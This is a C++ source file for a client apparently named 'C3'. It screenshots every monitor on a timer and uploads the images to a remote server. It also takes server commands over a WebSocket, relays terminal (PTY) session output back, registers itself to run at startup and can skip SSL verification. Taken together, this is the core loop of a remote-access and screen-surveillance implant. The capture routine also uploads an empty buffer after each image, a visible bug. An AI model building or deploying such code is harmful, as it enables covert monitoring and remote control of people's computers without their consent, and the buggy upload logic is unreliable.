#include "app/C3App.h"

#include <chrono>
#include <thread>

C3App::C3App()
    : m_running(true),
      m_config(),
      m_controller(),
      m_dispatcher(m_controller, m_config),
      m_wsClient() {
    Logger::init(spdlog::level::info, spdlog::level::info);

    // 根据编译配置选择配置模式
#ifdef USE_HARDCODED_CONFIG
    // 硬编码配置模式
    Logger::info("=== C3 Initializing Hardcoded Configuration ===");
    if (m_config.initHardcoded()) {
        Logger::info("Hardcoded config initialized successfully");
        m_config.listHardcoded();
    } else {
        Logger::error("Failed to initialize hardcoded config");
        m_running = false;  // 停止运行
    }
#else
    // 配置文件模式
    Logger::info("=== C3 Starting with Config File Mode ===");
    if (m_config.load("config.json")) {
        Logger::info("Config loaded successfully");
        m_config.list();
    } else {
        Logger::error("Failed to load config.json");
        m_running = false;  // 停止运行
    }
#endif

    // 如果配置加载失败，跳过后续操作
    if (!m_running) {
        Logger::error("Initialization failed. Exiting...");
        return;  // 终止构造函数
    }

    // 应用配置设置
    applyConfigSettings();

    // 启用高 DPI 感知
    SystemUtils::enableHighDPI();

    // 设置截图回调函数
    m_dispatcher.registerScreenshotCallback([this]() {
        captureAndUpload();
    });

    // 设置响应回调函数
    PtyManager::getInstance().registerOutputCallback(
        [this](const nlohmann::json& response) {
            // 通过 WebSocket 发送响应回服务器
            m_wsClient.send(response);
        });
}

C3App::~C3App() {
    // 调用统一的清理方法
    stop();
    Logger::info("C3 shutdown complete");
}

int C3App::run() {
    if (m_running) {
        startWebSocketCommandListener();
        mainLoop();
        return 0;
    }
    // 初始化时出错
    return -1;
}

void C3App::stop() {
    m_running = false;

    // 关闭所有PTY会话
    Logger::info("Closing PTY sessions...");
    PtyManager::getInstance().shutdownAllPtySessions();

    // 关闭 WebSocket 客户端
    Logger::info("Closing WebSocket client...");
    m_wsClient.close();

    Logger::info("C3 stopped successfully");
}

void C3App::startWebSocketCommandListener() {
    // 设置接收到命令时的回调
    m_wsClient.registerOnCommandCallback(
        [this](const nlohmann::json& commands) {
            m_dispatcher.dispatchCommands(commands);
        });

    // 启动 WebSocket 客户端
    std::string endpoint = getWebSocketEndpoint();
    std::string wsUrl = URLBuilder::buildWebSocketUrl(m_config, endpoint);
    m_wsClient.connectOrReconnect(wsUrl, m_config.skip_ssl_verification);
}

void C3App::mainLoop() {
    // 进入主循环
    while (m_running) {
        // 如果接收到 pause 命令，暂停，等待服务器的 resume 命令
        m_controller.waitIfPaused();

        // 开始计时
        auto start = std::chrono::steady_clock::now();

        // 检查配置文件是否有更新（仅在配置文件模式下）
        if (!Config::isHardcodedMode()) {
            bool config_changed = m_config.try_reload_config("config.json");
            if (config_changed && m_config.remote_changed) {
                // 本地新修改覆盖远程修改，可能导致服务端没有达到预期效果
                Logger::warn("Local edits override remote changes");
            }
            if (config_changed || m_config.remote_changed) {
                // 本地或远程进行了修改
                m_config.remote_changed = false;
                applyConfigSettings();
            }
        } else {
            // 硬编码配置模式：处理远程配置更改
            if (m_config.remote_changed) {
                Logger::warn(
                    "Remote config change detected, but using hardcoded config "
                    "- ignoring");
                m_config.remote_changed = false;
            }
        }

        // 执行定时截图
        captureAndUpload();

        // 等待下一次上传
        Logger::info("Waiting for next capture...");
        std::this_thread::sleep_until(
            start + std::chrono::seconds(m_config.interval_seconds));
    }
}

void C3App::captureAndUpload() {
    std::vector<RawImage> rawVec = ScreenCapturer::captureAllMonitors();
    if (rawVec.empty()) {
        Logger::error("Failed to capture screen");
        return;
    }
    for (const auto& raw : rawVec) {
        std::vector<uint8_t> frame;
        // 编码图像
        auto result = ImageEncoder::encodeToJPEG(raw, 90);
        if (result) {
            std::vector<uint8_t> jpegData = result.value();
            uploadImageWithRetry(jpegData);
        } else {
            std::string errorMsg = result.error();
            Logger::error(std::format("JPEG encoding failed: {}", errorMsg));
        }

        uploadImageWithRetry(frame);
    }
}

void C3App::uploadImageWithRetry(const std::vector<uint8_t>& frame) {
    std::string endPoint = getScreenshotEndpoint();
    std::string uploadUrl = URLBuilder::buildHTTPUrl(m_config, endPoint);
    Logger::info(std::format("Uploading to: {}", uploadUrl));

    Uploader::uploadWithRetry(
        [&]() {
            return Uploader::uploadImageWithSSL(frame, uploadUrl,
                                                m_config.skip_ssl_verification);
        },
        m_config.max_retries, m_config.retry_delay_ms);
}

void C3App::uploadConfigWithRetry() {
    std::string endPoint = getConfigEndpoint();
    std::string uploadUrl = URLBuilder::buildHTTPUrl(m_config, endPoint);
    Logger::info(std::format("Uploading to: {}", uploadUrl));

    Uploader::uploadWithRetry(
        [&]() {
            return Uploader::uploadConfigWithSSL(
                m_config.toJson(), uploadUrl, m_config.skip_ssl_verification);
        },
        m_config.max_retries, m_config.retry_delay_ms);
}

void C3App::applyConfigSettings() {
    // 上传配置文件
    uploadConfigWithRetry();

    // 设置开机自启
    if (m_config.add_to_startup) {
        SystemUtils::addToStartup("C3");
        Logger::info("Added to startup successfully");
    } else {
        SystemUtils::removeFromStartup("C3");
        Logger::info("Removed from startup successfully");
    }

    // 确保 WebSocket 连接
    std::string endpoint = getWebSocketEndpoint();
    std::string wsUrl = URLBuilder::buildWebSocketUrl(m_config, endpoint);
    m_wsClient.connectOrReconnect(wsUrl,

                                  m_config.skip_ssl_verification);
}
